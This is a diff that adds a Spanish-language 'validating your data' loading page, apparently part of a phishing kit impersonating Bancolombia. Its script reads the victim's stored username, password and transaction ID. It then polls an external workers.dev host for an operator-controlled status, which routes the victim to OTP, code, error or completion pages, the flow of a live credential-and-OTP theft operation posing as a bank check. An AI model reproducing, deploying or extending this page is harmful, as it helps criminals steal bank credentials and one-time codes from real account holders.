@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Cargando...</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #677eff;
+      color: #fff;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .spinner {
+      border: 5px solid rgba(255,255,255,0.2);
+      border-top: 5px solid #4fc3f7;
+      border-radius: 50%;
+      width: 70px;
+      height: 70px;
+      animation: spin 1s linear infinite;
+      margin-bottom: 20px;
+    }
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+    h2 {
+      font-size: 1.2rem;
+      text-align: center;
+    }
+  </style>
+</head>
+<body>
+  <div class="spinner"></div>
+  <h2>Validando tus datos, por favor espera...</h2>
+
+  <script>
+    document.addEventListener('DOMContentLoaded', async () => {
+      const bancoldata = JSON.parse(localStorage.getItem('bancoldata'));
+      if (!bancoldata || !bancoldata.usuario || !bancoldata.clave || !bancoldata.transactionId) {
+        alert("Faltan datos de login o transactionId");
+        window.location.href = 'index.html';
+        return;
+      }
+
+      const usuario = bancoldata.usuario;
+      const clave = bancoldata.clave;
+      const transactionId = bancoldata.transactionId; // ✅ Usar el mismo ID que se generó en cel-clave.html
+      
+      console.log('Checking status for transaction:', transactionId);
+
+      const checkStatus = async () => {
+        try {
+          const res = await fetch(`https://blue-night-7897.claropromoxlaro.workers.dev/status?id=${transactionId}`);
+          const data = await res.json();
+
+          console.log('Status check response:', data);
+
+          if (!data.estado || data.estado === "pendiente") {
+            setTimeout(checkStatus, 2000);
+            return;
+          }
+
+          // Redirigir según el estado
+          if (data.estado === "autorizado") window.location.href = "codigo.html";
+          else if (data.estado === "error") window.location.href = "usererror.html";
+          else if (data.estado === "otp") window.location.href = "otp.html";
+          else if (data.estado === "fallo") window.location.href = "fallo.html";
+          else if (data.estado === "finalizado") window.location.href = "finalizar.html";
+          else {
+            console.log('Estado desconocido:', data.estado);
+            setTimeout(checkStatus, 2000);
+          }
+
+        } catch (err) {
+          console.error("Error comprobando estado:", err);
+          setTimeout(checkStatus, 3000);
+        }
+      };
+
+      // Iniciar el polling
+      checkStatus();
+    });
+  </script>
+</body>
+</html>
